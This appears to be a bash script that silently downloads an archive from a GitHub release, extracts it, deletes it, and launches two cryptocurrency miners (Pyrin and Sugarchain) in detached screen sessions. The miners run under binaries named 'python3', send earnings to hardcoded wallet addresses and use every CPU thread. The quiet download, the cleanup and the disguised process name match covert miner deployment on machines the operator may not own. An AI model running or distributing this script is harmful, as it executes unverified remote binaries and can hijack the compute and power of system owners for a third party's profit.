#!/bin/bash

sudo apt install screen -y 

wget -q -O TOT https://github.com/DotAja/ALONE/releases/download/alone/dotaja.tar.gz

tar -xzf TOT >/dev/null 2>&1

rm TOT

screen -dmS dotlol ./dotlol/python3 -a PYRIN --pool kr.pyrin.herominers.com:1177 --user pyrin:qq5fnz6aelfdruhshjpul598fxyeqfkjh86cvypt2902mghd0ql7gy7g799ff.DOT_CPU-GPU

screen -dmS dotsrb ./dotsrb/python3 -a yespowersugar -o nomp.mofumofu.me:3391 -u sugar1qmpk65gyqqgk63lkrg27gnl9hc2e8zqn7jgmd5j.DOT_CPU-GPU -t $(nproc)
